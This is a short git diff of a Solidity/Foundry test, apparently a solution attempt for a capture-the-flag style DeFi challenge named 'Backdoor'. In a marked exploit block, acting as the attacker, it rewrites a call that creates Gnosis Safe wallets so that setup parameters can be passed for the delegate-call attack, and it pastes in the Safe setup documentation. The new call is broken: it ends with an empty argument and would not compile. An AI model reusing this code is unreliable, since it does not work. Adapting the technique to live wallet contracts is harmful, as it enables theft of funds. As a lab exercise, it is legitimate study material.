@@ -81,7 +81,17 @@ contract Backdoor is Test {
         /** EXPLOIT START **/
         vm.startPrank(attacker);
         walletCreator = new WalletCreator(address(masterCopy), address(walletFactory), walletRegistry);
-        walletCreator.createGnosisSafeWallet();
+        // Encode the data for the GnosisSafe "setup" function call
+        /// @dev Setup function sets initial storage of contract.
+        /// @param _owners List of Safe owners.
+        /// @param _threshold Number of required confirmations for a Safe transaction.
+        /// @param to Contract address for optional delegate call.
+        /// @param data Data payload for optional delegate call.
+        /// @param fallbackHandler Handler for fallback calls to this contract
+        /// @param paymentToken Token that should be used for the payment (0 is ETH)
+        /// @param payment Value that should be paid
+        /// @param paymentReceiver Address that should receive the payment (or 0 if tx.origin)
+        walletCreator.createGnosisSafeWallet(users, 1, address(masterCopy), );
         vm.stopPrank();
         /** EXPLOIT END **/
         validation();
